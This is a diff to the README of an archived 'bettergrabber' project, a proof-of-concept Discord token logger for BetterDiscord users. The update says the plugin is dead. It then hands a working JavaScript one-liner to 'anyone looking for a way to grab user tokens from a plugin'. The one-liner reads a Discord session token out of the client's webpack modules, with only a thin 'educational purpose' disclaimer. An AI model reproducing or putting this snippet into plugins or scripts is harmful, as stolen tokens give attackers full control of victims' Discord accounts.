@@ -1,3 +1,11 @@
+**UPDATE 09/18/2022**: This plugin no longer works. An update in both Webpack and BetterDiscord renders it useless, and thus this repository is archived.
+
+To anyone looking for a way to grab user tokens from a plugin, this snippet from this [StackOverflow post](https://stackoverflow.com/questions/67348339/any-way-to-get-my-discord-token-from-browser-dev-console) still works as of writing:
+```js
+(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+```
+As with the warning below, this is for educational purpose.
+
 # bettergrabber
 
 proof of concept discord token logger aimed at BetterDiscord users
